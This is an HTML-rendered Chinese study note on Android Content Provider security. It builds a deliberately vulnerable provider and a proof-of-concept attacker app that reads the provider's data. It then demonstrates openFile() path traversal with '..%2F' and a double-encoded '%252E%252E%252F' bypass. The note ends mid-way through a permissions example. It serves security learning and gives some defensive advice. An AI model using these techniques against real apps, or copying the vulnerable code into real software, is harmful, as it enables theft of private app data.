<!DOCTYPE html>
<html>
<head>
<title>Android Content Provider组件安全学习笔记</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<style type="text/css">
/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
/* Author: Nicolas Hery - http://nicolashery.com */
/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
/* Source: https://github.com/nicolahery/markdownpad-github */

/* RESET
=============================================================================*/

html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
  margin: 0;
  padding: 0;
  border: 0;
}

/* BODY
=============================================================================*/

body {
  font-family: Helvetica, arial, freesans, clean, sans-serif;
  font-size: 14px;
  line-height: 1.6;
  color: #333;
  background-color: #fff;
  padding: 20px;
  max-width: 960px;
  margin: 0 auto;
}

body>*:first-child {
  margin-top: 0 !important;
}

body>*:last-child {
  margin-bottom: 0 !important;
}

/* BLOCKS
=============================================================================*/

p, blockquote, ul, ol, dl, table, pre {
  margin: 15px 0;
}

/* HEADERS
=============================================================================*/

h1, h2, h3, h4, h5, h6 {
  margin: 20px 0 10px;
  padding: 0;
  font-weight: bold;
  -webkit-font-smoothing: antialiased;
}

h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
  font-size: inherit;
}

h1 {
  font-size: 28px;
  color: #000;
}

h2 {
  font-size: 24px;
  border-bottom: 1px solid #ccc;
  color: #000;
}

h3 {
  font-size: 18px;
}

h4 {
  font-size: 16px;
}

h5 {
  font-size: 14px;
}

h6 {
  color: #777;
  font-size: 14px;
}

body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
  margin-top: 0;
  padding-top: 0;
}

a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
  margin-top: 0;
  padding-top: 0;
}

h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
  margin-top: 10px;
}

/* LINKS
=============================================================================*/

a {
  color: #4183C4;
  text-decoration: none;
}

a:hover {
  text-decoration: underline;
}

/* LISTS
=============================================================================*/

ul, ol {
  padding-left: 30px;
}

ul li > :first-child, 
ol li > :first-child, 
ul li ul:first-of-type, 
ol li ol:first-of-type, 
ul li ol:first-of-type, 
ol li ul:first-of-type {
  margin-top: 0px;
}

ul ul, ul ol, ol ol, ol ul {
  margin-bottom: 0;
}

dl {
  padding: 0;
}

dl dt {
  font-size: 14px;
  font-weight: bold;
  font-style: italic;
  padding: 0;
  margin: 15px 0 5px;
}

dl dt:first-child {
  padding: 0;
}

dl dt>:first-child {
  margin-top: 0px;
}

dl dt>:last-child {
  margin-bottom: 0px;
}

dl dd {
  margin: 0 0 15px;
  padding: 0 15px;
}

dl dd>:first-child {
  margin-top: 0px;
}

dl dd>:last-child {
  margin-bottom: 0px;
}

/* CODE
=============================================================================*/

pre, code, tt {
  font-size: 12px;
  font-family: Consolas, "Liberation Mono", Courier, monospace;
}

code, tt {
  margin: 0 0px;
  padding: 0px 0px;
  white-space: nowrap;
  border: 1px solid #eaeaea;
  background-color: #f8f8f8;
  border-radius: 3px;
}

pre>code {
  margin: 0;
  padding: 0;
  white-space: pre;
  border: none;
  background: transparent;
}

pre {
  background-color: #f8f8f8;
  border: 1px solid #ccc;
  font-size: 13px;
  line-height: 19px;
  overflow: auto;
  padding: 6px 10px;
  border-radius: 3px;
}

pre code, pre tt {
  background-color: transparent;
  border: none;
}

kbd {
    -moz-border-bottom-colors: none;
    -moz-border-left-colors: none;
    -moz-border-right-colors: none;
    -moz-border-top-colors: none;
    background-color: #DDDDDD;
    background-image: linear-gradient(#F1F1F1, #DDDDDD);
    background-repeat: repeat-x;
    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
    border-image: none;
    border-radius: 2px 2px 2px 2px;
    border-style: solid;
    border-width: 1px;
    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
    line-height: 10px;
    padding: 1px 4px;
}

/* QUOTES
=============================================================================*/

blockquote {
  border-left: 4px solid #DDD;
  padding: 0 15px;
  color: #777;
}

blockquote>:first-child {
  margin-top: 0px;
}

blockquote>:last-child {
  margin-bottom: 0px;
}

/* HORIZONTAL RULES
=============================================================================*/

hr {
  clear: both;
  margin: 15px 0;
  height: 0px;
  overflow: hidden;
  border: none;
  background: transparent;
  border-bottom: 4px solid #ddd;
  padding: 0;
}

/* TABLES
=============================================================================*/

table th {
  font-weight: bold;
}

table th, table td {
  border: 1px solid #ccc;
  padding: 6px 13px;
}

table tr {
  border-top: 1px solid #ccc;
  background-color: #fff;
}

table tr:nth-child(2n) {
  background-color: #f8f8f8;
}

/* IMAGES
=============================================================================*/

img {
  max-width: 100%
}
</style>
<style type="text/css">
.highlight  { background: #ffffff; }
.highlight .c { color: #999988; font-style: italic } /* Comment */
.highlight .err { color: #a61717; background-color: #e3d2d2 } /* Error */
.highlight .k { font-weight: bold } /* Keyword */
.highlight .o { font-weight: bold } /* Operator */
.highlight .cm { color: #999988; font-style: italic } /* Comment.Multiline */
.highlight .cp { color: #999999; font-weight: bold } /* Comment.Preproc */
.highlight .c1 { color: #999988; font-style: italic } /* Comment.Single */
.highlight .cs { color: #999999; font-weight: bold; font-style: italic } /* Comment.Special */
.highlight .gd { color: #000000; background-color: #ffdddd } /* Generic.Deleted */
.highlight .gd .x { color: #000000; background-color: #ffaaaa } /* Generic.Deleted.Specific */
.highlight .ge { font-style: italic } /* Generic.Emph */
.highlight .gr { color: #aa0000 } /* Generic.Error */
.highlight .gh { color: #999999 } /* Generic.Heading */
.highlight .gi { color: #000000; background-color: #ddffdd } /* Generic.Inserted */
.highlight .gi .x { color: #000000; background-color: #aaffaa } /* Generic.Inserted.Specific */
.highlight .go { color: #888888 } /* Generic.Output */
.highlight .gp { color: #555555 } /* Generic.Prompt */
.highlight .gs { font-weight: bold } /* Generic.Strong */
.highlight .gu { color: #aaaaaa } /* Generic.Subheading */
.highlight .gt { color: #aa0000 } /* Generic.Traceback */
.highlight .kc { font-weight: bold } /* Keyword.Constant */
.highlight .kd { font-weight: bold } /* Keyword.Declaration */
.highlight .kp { font-weight: bold } /* Keyword.Pseudo */
.highlight .kr { font-weight: bold } /* Keyword.Reserved */
.highlight .kt { color: #445588; font-weight: bold } /* Keyword.Type */
.highlight .m { color: #009999 } /* Literal.Number */
.highlight .s { color: #d14 } /* Literal.String */
.highlight .na { color: #008080 } /* Name.Attribute */
.highlight .nb { color: #0086B3 } /* Name.Builtin */
.highlight .nc { color: #445588; font-weight: bold } /* Name.Class */
.highlight .no { color: #008080 } /* Name.Constant */
.highlight .ni { color: #800080 } /* Name.Entity */
.highlight .ne { color: #990000; font-weight: bold } /* Name.Exception */
.highlight .nf { color: #990000; font-weight: bold } /* Name.Function */
.highlight .nn { color: #555555 } /* Name.Namespace */
.highlight .nt { color: #000080 } /* Name.Tag */
.highlight .nv { color: #008080 } /* Name.Variable */
.highlight .ow { font-weight: bold } /* Operator.Word */
.highlight .w { color: #bbbbbb } /* Text.Whitespace */
.highlight .mf { color: #009999 } /* Literal.Number.Float */
.highlight .mh { color: #009999 } /* Literal.Number.Hex */
.highlight .mi { color: #009999 } /* Literal.Number.Integer */
.highlight .mo { color: #009999 } /* Literal.Number.Oct */
.highlight .sb { color: #d14 } /* Literal.String.Backtick */
.highlight .sc { color: #d14 } /* Literal.String.Char */
.highlight .sd { color: #d14 } /* Literal.String.Doc */
.highlight .s2 { color: #d14 } /* Literal.String.Double */
.highlight .se { color: #d14 } /* Literal.String.Escape */
.highlight .sh { color: #d14 } /* Literal.String.Heredoc */
.highlight .si { color: #d14 } /* Literal.String.Interpol */
.highlight .sx { color: #d14 } /* Literal.String.Other */
.highlight .sr { color: #009926 } /* Literal.String.Regex */
.highlight .s1 { color: #d14 } /* Literal.String.Single */
.highlight .ss { color: #990073 } /* Literal.String.Symbol */
.highlight .bp { color: #999999 } /* Name.Builtin.Pseudo */
.highlight .vc { color: #008080 } /* Name.Variable.Class */
.highlight .vg { color: #008080 } /* Name.Variable.Global */
.highlight .vi { color: #008080 } /* Name.Variable.Instance */
.highlight .il { color: #009999 } /* Literal.Number.Integer.Long */
.pl-c {
    color: #969896;
}

.pl-c1,.pl-mdh,.pl-mm,.pl-mp,.pl-mr,.pl-s1 .pl-v,.pl-s3,.pl-sc,.pl-sv {
    color: #0086b3;
}

.pl-e,.pl-en {
    color: #795da3;
}

.pl-s1 .pl-s2,.pl-smi,.pl-smp,.pl-stj,.pl-vo,.pl-vpf {
    color: #333;
}

.pl-ent {
    color: #63a35c;
}

.pl-k,.pl-s,.pl-st {
    color: #a71d5d;
}

.pl-pds,.pl-s1,.pl-s1 .pl-pse .pl-s2,.pl-sr,.pl-sr .pl-cce,.pl-sr .pl-sra,.pl-sr .pl-sre,.pl-src,.pl-v {
    color: #df5000;
}

.pl-id {
    color: #b52a1d;
}

.pl-ii {
    background-color: #b52a1d;
    color: #f8f8f8;
}

.pl-sr .pl-cce {
    color: #63a35c;
    font-weight: bold;
}

.pl-ml {
    color: #693a17;
}

.pl-mh,.pl-mh .pl-en,.pl-ms {
    color: #1d3e81;
    font-weight: bold;
}

.pl-mq {
    color: #008080;
}

.pl-mi {
    color: #333;
    font-style: italic;
}

.pl-mb {
    color: #333;
    font-weight: bold;
}

.pl-md,.pl-mdhf {
    background-color: #ffecec;
    color: #bd2c00;
}

.pl-mdht,.pl-mi1 {
    background-color: #eaffea;
    color: #55a532;
}

.pl-mdr {
    color: #795da3;
    font-weight: bold;
}

.pl-mo {
    color: #1d3e81;
}
.task-list {
padding-left:10px;
margin-bottom:0;
}

.task-list li {
    margin-left: 20px;
}

.task-list-item {
list-style-type:none;
padding-left:10px;
}

.task-list-item label {
font-weight:400;
}

.task-list-item.enabled label {
cursor:pointer;
}

.task-list-item+.task-list-item {
margin-top:3px;
}

.task-list-item-checkbox {
display:inline-block;
margin-left:-20px;
margin-right:3px;
vertical-align:1px;
}
</style>
</head>
<body>
<h1 id="android-content-provider-">Android Content Provider组件安全学习笔记</h1>
<p><strong>Author:wnagzihxa1n<br>E-Mail:wnagzihxa1n@gmail.com</strong></p>
<p>Content Provider是用于读取自身应用数据，跨进程读取数据，或者读取系统数据，比如短信，联系人，相册等</p>
<p>我们举个例子，获取手机的联系人然后输出来</p>
<p>API选择16及以下，不要选择17及以上的，我这里选择16，接下来的实践过程务必完全按照我这里的步骤来，因为我在实践的过程中碰到了非常多的坑，包括前面说的版本问题，还有其它问题，任何一个小细节都有可能导致无法读取到数据（<strong>另外，各位同学千万不要学我这样写，这是在UI线程里执行查询，因为我测试的只有一条数据，如果数据大就GG了，可以使用AsyncQueryHandler异步查询框架</strong>）</p>
<pre><code>public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            while (cursor.moveToNext()) {
                String contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                Toast.makeText(MainActivity.this, contactName + &#39;\n&#39; + phoneNumber, Toast.LENGTH_LONG).show();
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }
}
</code></pre><p>我用的是谷歌的Pixel模拟器，系统是4.4.4</p>
<p><img src="Image/1.png" alt=""></p>
<p>一般来说，我们如果要实现自己的数据存储读取，就会自己实现对应的Content Provider来对数据进行存取，官方文档如下：</p>
<ul>
<li><a href="https://developer.android.google.cn/reference/android/content/ContentProvider.html">https://developer.android.google.cn/reference/android/content/ContentProvider.html</a></li></ul>
<p>如下一共6个方法需要被实现：</p>
<ul>
<li>onCreate() which is called to initialize the provider</li><li>query(Uri, String[], Bundle, CancellationSignal) which returns data to the caller</li><li>insert(Uri, ContentValues) which inserts new data into the content provider</li><li>update(Uri, ContentValues, String, String[]) which updates existing data in the content provider</li><li>delete(Uri, String, String[]) which deletes data from the content provider</li><li>getType(Uri) which returns the MIME type of data in the content provider</li></ul>
<p>因为我们上面的例子只是简单的看了下Content Provider的使用，其实还有个知识点是<code>URI</code>，所以我们这里换一种方式来写，同样是查询联系人</p>
<pre><code>public class MainActivity extends Activity {

    static final String TAG = &quot;toT0C&quot;;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Cursor cursor = null;
        try {
            ContentResolver contentResolver = getContentResolver();
            Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
            Log.i(TAG, uri.toString());
            cursor = contentResolver.query(uri, null, null, null, null);
            while (cursor.moveToNext()) {
                String contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                Log.i(TAG, contactName + &#39; &#39; + phoneNumber);
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }
}
</code></pre><p>日志输出，有个关键修改的是<code>URI</code>，这个是用于查询数据的一个路径，系统提供了很多，比如联系人的<code>URI</code>如下输出，可以看到就是一个路径</p>
<pre><code>01-23 02:14:40.461 3116-3116/com.wnagzihxa1n.contentprovider I/toT0C: content://com.android.contacts/data/phones
01-23 02:14:40.471 3116-3116/com.wnagzihxa1n.contentprovider I/toT0C: wnagzihxai1n 1 999-999-3389
</code></pre><p>但是有的时候我们开发需要自己定义这种路径来查询自己应用内部的数据，所以需要修改成如下</p>
<pre><code>Uri uri = Uri.parse(&quot;content://com.android.contacts/data/phones&quot;);
</code></pre><p><code>URI</code>叫做通用资源标识符，它由三部分构成：</p>
<ul>
<li><code>content://</code>：固定前缀</li><li><code>com.android.contacts</code>：Authority是唯一的标识</li><li><code>/data/phones</code>：具体的数据路径</li></ul>
<p>接着我们来定义自己的Content Provider，数据源是一个自定义的数据库，弄一个联系人存储的</p>
<pre><code>public class MySqlHelper extends SQLiteOpenHelper {

    private static String DBName = &quot;PersonDB.db&quot;;
    private static int version = 1;

    public MySqlHelper(Context context) {
        super(context, DBName, null, version);
    }

    @Override
    public void onCreate(SQLiteDatabase sqLiteDatabase) {
        String sql = &quot;create table Person (id integer primary key autoincrement, name nvarchar(100), phoneNumber nvarchar(100))&quot;;
        sqLiteDatabase.execSQL(sql);
    }

    @Override
    public void onUpgrade(SQLiteDatabase sqLiteDatabase, int i, int i1) {
    }
}
</code></pre><p>接着要创建一个Content Provider，组件要先在<code>AndroidManifest.xml</code>进行注册</p>
<pre><code>&lt;provider
    android:authorities=&quot;com.wnagzihxa1n.contentprovider.MyContentProvider&quot;
    android:name=&quot;.MyContentProvider&quot;/&gt;
</code></pre><p><code>MyContentProvider</code>的具体实现，这里只实现了<code>insert</code>和<code>query</code></p>
<pre><code>public class MyContentProvider extends ContentProvider {
    private static UriMatcher uriMatcher;
    private MySqlHelper mySqlHelper = null;
    private static final int CONTENT_INSERT = 0;
    private static final int CONTENT_QUERY = 1;

    static {
        uriMatcher = new UriMatcher(UriMatcher.NO_MATCH);
        uriMatcher.addURI(&quot;com.wnagzihxa1n.contentprovider.MyContentProvider&quot;, &quot;person/insert&quot;, CONTENT_INSERT);
        uriMatcher.addURI(&quot;com.wnagzihxa1n.contentprovider.MyContentProvider&quot;, &quot;person/query&quot;, CONTENT_QUERY);
    }

    @Override
    public boolean onCreate() {
        try {
            mySqlHelper = new MySqlHelper(getContext());
            return true;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    @Override
    public Cursor query(Uri uri, String[] strings, String s, String[] strings1, String s1) {
        SQLiteDatabase sqLiteDatabase = mySqlHelper.getWritableDatabase();
        switch (uriMatcher.match(uri)) {
            case CONTENT_QUERY:
                if (sqLiteDatabase.isOpen()) {
                    Cursor cursor = sqLiteDatabase.query(&quot;Person&quot;, strings, s, strings1, null, null, null);
                    return cursor;
                }
                break;
            default:
                break;
        }
        return null;
    }

    @Override
    public String getType(Uri uri) {
        return null;
    }

    @Override
    public Uri insert(Uri uri, ContentValues contentValues) {
        SQLiteDatabase sqLiteDatabase = mySqlHelper.getWritableDatabase();
        switch (uriMatcher.match(uri)) {
            case CONTENT_INSERT:
                if (sqLiteDatabase.isOpen()) {
                    long id = sqLiteDatabase.insert(&quot;Person&quot;, null, contentValues);
                    sqLiteDatabase.close();
                    return ContentUris.withAppendedId(uri, id);
                }
                break;
            default:
                break;
        }
        return null;
    }

    @Override
    public int delete(Uri uri, String s, String[] strings) {
        return 0;
    }

    @Override
    public int update(Uri uri, ContentValues contentValues, String s, String[] strings) {
        return 0;
    }
}
</code></pre><p>来实现调用，先插入，再查询</p>
<pre><code>public class MainActivity extends Activity {

    static final String TAG = &quot;toT0C&quot;;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        ContentResolver contentResolver = getContentResolver();

        // 插入数据
        Uri uri_insert = Uri.parse(&quot;content://com.wnagzihxa1n.contentprovider.MyContentProvider/person/insert&quot;);
        ContentValues values = new ContentValues();
        values.put(&quot;id&quot;, 1);
        values.put(&quot;name&quot;, &quot;wnagzihxa1n&quot;);
        values.put(&quot;phoneNumber&quot;, &quot;1 999-999-3389&quot;);
        contentResolver.insert(uri_insert, values);

        // 查询数据
        Cursor cursor = null;
        try {
            Uri uri_query = Uri.parse(&quot;content://com.wnagzihxa1n.contentprovider.MyContentProvider/person/query&quot;);
            cursor = contentResolver.query(uri_query, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    int id = cursor.getInt(0);
                    String contactName = cursor.getString(1);
                    String phoneNumber = cursor.getString(2);
                    Log.i(TAG, String.valueOf(id) + &#39; &#39; + contactName + &#39; &#39; + phoneNumber);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }
}
</code></pre><p>运行起来看看</p>
<pre><code>01-23 04:07:22.739 2856-2856/com.wnagzihxa1n.contentprovider I/toT0C: 1 wnagzihxa1n 1 999-999-3389
</code></pre><p>这里就带出了今天我们要讨论的第一个漏洞，来看我们在<code>AndroidManifest.xml</code>里对<code>MyContentProvider</code>的定义</p>
<pre><code>&lt;provider
    android:authorities=&quot;com.wnagzihxa1n.contentprovider.MyContentProvider&quot;
    android:name=&quot;.MyContentProvider&quot;/&gt;
</code></pre><p>这里有一个默认的属性<code>exported</code>，若APP的API Level在17及以上，默认为不导出，也就是<code>false</code>，不受影响，但是如果<code>build.gradle</code>里面的这两个字段都是16及以下，那就受影响了，特别是<code>minSdkVersion</code>一般都是8</p>
<pre><code>minSdkVersion 16
targetSdkVersion 16
</code></pre><p>那么假设这两个字段都是16，也就是说这个组件是默认导出的，我们可以通过其它应用外部来调用这个组件，通过这个组件内部的一些功函数来实现数据的读取，来试试</p>
<p>首先写一个攻击APP，由于此时我们并不清楚SDK版本是否影响PocAPK，所以依旧是使用16</p>
<pre><code>public class MainActivity extends Activity {

    private TextView textView;
    static final String TAG = &quot;toT0C&quot;;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        textView = (TextView) findViewById(R.id.text);
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = null;
        try {
            Uri uri_query = Uri.parse(&quot;content://com.wnagzihxa1n.contentprovider.MyContentProvider/person/query&quot;);
            cursor = contentResolver.query(uri_query, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    int id = cursor.getInt(0);
                    String contactName = cursor.getString(1);
                    String phoneNumber = cursor.getString(2);
                    textView.setText(String.valueOf(id) + &#39; &#39; + contactName + &#39; &#39; + phoneNumber);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }
}
</code></pre><p>先运行被攻击APP，可以看到数据已经生成</p>
<p><img src="Image/2.png" alt=""></p>
<p>然后运行PocAPK，读出了数据</p>
<p><img src="Image/3.png" alt=""></p>
<p>接着我们来测试，如果PocAPK使用的SDK版本大于等于17会怎样</p>
<p>这里使用同样的代码，SDK使用19，可以看到是可以成功读取的</p>
<p><img src="Image/4.png" alt=""></p>
<p>那么如果漏洞APP的<code>targetSdkVersion</code>大于等于17呢？</p>
<p>我们将这个字段设置为19，可以看到权限拒绝</p>
<p><img src="Image/5.png" alt=""></p>
<p>那么这三个对比可以说明：对于API Level小于17这个说法，是针对漏洞APP的，并且<code>minSdkVersion</code>和<code>targetSdkVersion</code>都要小于17，我反编译了一部分的APP，发现很多都是<code>minSdkVersion</code>是8，那么<code>targetSdkVersion</code>小于17即可，条件还是很好满足的</p>
<p>不过呢，这是默认的属性，如果我们手动定义<code>exported</code>为<code>true</code>，那么不管是什么版本的SDK，都会受影响（暂不考虑私有权限保护等），就是说其它应用都可以访问</p>
<pre><code>&lt;provider
    android:authorities=&quot;com.wnagzihxa1n.contentprovider.MyContentProvider&quot;
    android:name=&quot;.MyContentProvider&quot;
    android:exported=&quot;true&quot;&gt;
</code></pre><p>首先把<code>targetSdkVersion</code>调到19，这样<code>exported</code>默认是<code>false</code>，然后如上，添加属性</p>
<pre><code>android:exported=&quot;true&quot;
</code></pre><p>可以读到数据</p>
<p><img src="Image/6.png" alt=""></p>
<p>把条件对调，把<code>targetSdkVersion</code>设置为16，但是把<code>exported</code>设置为<code>false</code></p>
<p>不能读到数据</p>
<p><img src="Image/7.png" alt=""></p>
<p>所以说，不必要导出的组件就设置成不导出</p>
<p>上面我们实现了最基础的无保护情况下的数据读取，其实还有一个函数<code>openFile()</code>，如果实现了这个接口可以用于读取自身应用文件数据</p>
<p>首先我们注释掉无关代码，比如数据查询等，同时把<code>exported</code>属性去掉，使用默认值，并且把<code>targetSdkVersion</code>改为16</p>
<p>假如我们要读取<code>files/demo.xml</code>，完整路径如下</p>
<pre><code>01-23 23:48:10.818 2249-2249/com.wnagzihxa1n.contentprovider I/toT0C: /data/data/com.wnagzihxa1n.contentprovider/files
</code></pre><p>我们简单写一句话进去</p>
<pre><code>FileOutputStream fileOutputStream = null;
File directory = getFilesDir();
Log.i(TAG, directory.getAbsolutePath());
File demoXML = new File(directory.getAbsolutePath() + &quot;/demo.xml&quot;);
try {
    if (!demoXML.exists()) {
        demoXML.createNewFile();
    }
    fileOutputStream = new FileOutputStream(demoXML);
    byte[] data = &quot;Yes, you got me\n&quot;.getBytes();
    fileOutputStream.write(data);
} catch (Exception e) {
    e.printStackTrace();
} finally {
    try {
        fileOutputStream.close();
    } catch (Exception e) {
        e.printStackTrace();
    }
}
</code></pre><p>看一下写进去的效果</p>
<pre><code>root@generic_x86:/data/data/com.wnagzihxa1n.contentprovider/files # cat demo.xml
Yes, you got me
</code></pre><p>文件已经准备好了，接着我们来实现<code>openFile()</code>函数，文件名由路径中传入</p>
<pre><code>@Override
public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    String temp = uri.getPath().toString();
    String fileName = temp.substring(temp.lastIndexOf(&quot;/&quot;) + 1);
    File file = new File(getContext().getFilesDir() + &quot;/&quot; + fileName);
    if (file.exists()) {
        return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
    }
    return super.openFile(uri, mode);
}
</code></pre><p>尝试读取</p>
<pre><code>FileInputStream fileInputStream = null;
Uri uri_openfile = Uri.parse(&quot;content://com.wnagzihxa1n.contentprovider.MyContentProvider/files/demo.xml&quot;);
try {
    fileInputStream = (FileInputStream) contentResolver.openInputStream(uri_openfile);
    byte[] data = new byte[fileInputStream.available()];
    fileInputStream.read(data);
    Log.i(TAG, new String(data));
} catch (Exception e) {
    e.printStackTrace();
} finally {
    try {
        fileInputStream.close();
    } catch (Exception e) {
        e.printStackTrace();
    }
}
</code></pre><p>日志输出，可以正常读取到</p>
<pre><code>01-24 03:24:14.036 3516-3516/com.wnagzihxa1n.contentprovider I/toT0C: /data/data/com.wnagzihxa1n.contentprovider/files
01-24 03:24:14.036 3516-3516/com.wnagzihxa1n.contentprovider I/toT0C: Yes, you got me
</code></pre><p>最后修改PocAPK的代码</p>
<pre><code>FileInputStream fileInputStream = null;
Uri uri_openfile = Uri.parse(&quot;content://com.wnagzihxa1n.contentprovider.MyContentProvider/files/demo.xml&quot;);
try {
    fileInputStream = (FileInputStream) contentResolver.openInputStream(uri_openfile);
    byte[] data = new byte[fileInputStream.available()];
    fileInputStream.read(data);
    textView.setText(new String(data));
} catch (Exception e) {
    e.printStackTrace();
} finally {
    try {
        fileInputStream.close();
    } catch (Exception e) {
        e.printStackTrace();
    }
}
</code></pre><p>成功读取</p>
<p><img src="Image/8.png" alt=""></p>
<p>这个漏洞其实并不是盲目的读取，我们需要先研究一下目标应用的文件结构，比如<code>files</code>文件夹下都放着哪些文件，那么我们手动组合这些URI，就可以进行文件遍历</p>
<p>再进一步，我们可以结合<code>../</code>进行路径的遍历，可以回到父文件夹下获取数据，再进一步，我们可以遍历到整个安装程序的所有文件</p>
<p>修改漏洞APP的代码，这里换一种写法</p>
<pre><code>@Override
public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    File file = new File(getContext().getFilesDir(), uri.getLastPathSegment());
    if (file.exists()) {
        return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
    }
    return super.openFile(uri, mode);
}
</code></pre><p>重新编译运行，创建一个<code>demo1.xml</code>，这个就直接用命令行来就行</p>
<pre><code>root@generic_x86:/data/data/com.wnagzihxa1n.contentprovider # echo &quot;wa, you got me again&quot; &gt; demo.xml
root@generic_x86:/data/data/com.wnagzihxa1n.contentprovider # cat demo.xml
wa, you got me again
</code></pre><p>尝试去获取，注意URI路径，用<code>..%2F</code>来代替<code>../</code></p>
<pre><code>FileInputStream fileInputStream = null;
Uri uri_openfile = Uri.parse(&quot;content://com.wnagzihxa1n.contentprovider.MyContentProvider/files/..%2Fdemo.xml&quot;);
try {
    fileInputStream = (FileInputStream) contentResolver.openInputStream(uri_openfile);
    byte[] data = new byte[fileInputStream.available()];
    fileInputStream.read(data);
    textView.setText(new String(data));
} catch (Exception e) {
    e.printStackTrace();
} finally {
    try {
        fileInputStream.close();
    } catch (Exception e) {
        e.printStackTrace();
    }
}
</code></pre><p>运行起来，完成了任意文件读取</p>
<p><img src="Image/9.png" alt=""></p>
<p>那么如果客户端做了URL解码呢？就是把我们刚才的<code>..%2F</code>解码成<code>../</code>，用两次<code>getLastPathSegment()</code>就可以</p>
<pre><code>@Override
public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    File file = new File(getContext().getFilesDir(), Uri.parse(uri.getLastPathSegment()).getLastPathSegment());
    if (file.exists()) {
        return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
    }
    return super.openFile(uri, mode);
}
</code></pre><p>再次运行PocAPK</p>
<p><img src="Image/10.png" alt=""></p>
<p>如何绕过呢？在查资料的时候，找到了一种猥琐的知识</p>
<p>编码两次</p>
<pre><code>%252E%252E%252F
</code></pre><p>编码过程如下，第一次获取的时候会解码一次，再次获取就会再解码一次，最后变成了我们需要的</p>
<pre><code>01-24 04:34:43.145 2704-2704/? I/toT0C: %2E%2E%2Fdemo.xml
01-24 04:34:43.145 2704-2704/? I/toT0C: ../demo.xml
</code></pre><p>绕过限制成功读取</p>
<p><img src="Image/11.png" alt=""></p>
<p>所以在打开文件前对路径过滤是非常有必要的</p>
<pre><code>Uri.decode(uri_openfile.toString());
</code></pre><p>如果两个应用之间一定要跨进程读取数据呢？比如一个团队开发的两个应用，要读一下另一个应用数据什么的，那就需要设置权限</p>
<p>Content Provider是提供权限属性的</p>
<ul>
<li>permission</li><li>readPermission</li><li>writePermission</li></ul>
<p><code>permission</code>是读写权限，<code>readPermission</code>和<code>writePermission</code>分别是读和写权限</p>
<p>当有<code>readPermission</code>和<code>writePermission</code>任意一个存在，同时存在<code>permission</code>权限，以前者为准</p>
<p>比如一个应用同时设置了<code>permission</code>和<code>readPermission</code>权限，那么如果另一个应用想调用，必须设置<code>readPermission</code>才能读，如果只设置了<code>permission</code>只能写</p>
<p>同理，如果设置了<code>readPermission</code>和<code>writePermission</code>两个权限，但是另一个应用只提供了<code>permission</code>，不能读也不能写</p>
<p>我们来测试，首先在<code>Androidmanifest.xml</code>添加自定义权限，首先我们必须自定义权限，然后其它APP才能引入</p>
<pre><code>&lt;permission
    android:name=&quot;wnagzihxa1n.permission.ReadMyContentProvider&quot;
    android:label=&quot;Read MyContentProvider&quot;
    android:protectionLevel=&quot;normal&quot;/&gt;

&lt;permission
    android:name=&quot;wnagzihxa1n.permission.WriteMyContentProvider&quot;
    android:label=&quot;Write MyContentProvider&quot;
    android:protectionLevel=&quot;normal&quot;/&gt;
</code></pre><p>然后在<code>MyContentProvider</code>组件中调用，并且设置导出</p>
<pre><code>&lt;provider
    android:authorities=&quot;com.wnagzihxa1n.contentprovider.MyContentProvider&quot;
    android:name=&quot;.MyContentProvider&quot;
